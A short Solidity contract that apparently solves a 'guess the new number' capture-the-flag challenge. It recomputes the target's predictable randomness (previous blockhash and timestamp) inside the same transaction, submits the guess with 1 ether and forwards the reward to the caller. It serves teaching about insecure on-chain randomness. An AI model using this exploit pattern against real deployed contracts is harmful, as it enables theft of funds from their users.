pragma solidity 0.4.24;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) public payable;
}

contract GuessTheNewNumberChallengeSolver {
    function solveChallenge(address challenge) public payable {
        require(msg.value == 1 ether, 'msg.value');

        // compute answer
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        IGuessTheNewNumberChallenge instance = IGuessTheNewNumberChallenge(challenge);
        instance.guess.value(msg.value)(answer);

        // revert if reward not received
        require(address(this).balance >= 2 ether, 'eth not received');
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
